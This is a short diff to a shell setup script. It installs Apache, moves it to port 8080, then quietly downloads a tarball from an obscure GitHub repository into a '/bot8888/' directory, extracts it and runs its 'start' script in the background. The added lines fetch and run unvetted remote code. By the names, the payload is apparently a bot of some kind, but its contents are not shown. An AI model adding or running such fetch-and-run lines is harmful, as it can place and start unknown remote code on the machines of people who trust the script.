@@ -1,6 +1,27 @@
+apt-get install apache2 -y
+
+if [[ $(cat /etc/apache2/ports.conf | grep "8080") ]]
+then
+
+echo ""
+
+else
+
+sed -i "s/80/8080/g" /etc/apache2/ports.conf
+
+fi
+
 service apache2 start
 
+wget -q https://raw.githubusercontent.com/linuxweb888888888888/linux8888/refs/heads/main/linux8888888888.tar.gz
+
+mkdir /bot8888/
+
+cp ./linux8888888888.tar.gz /bot8888/linux8888888888.tar.gz
+
 cd /bot8888/
+
+tar -xvf ./linux8888888888.tar.gz
 
 bash ./start &
 
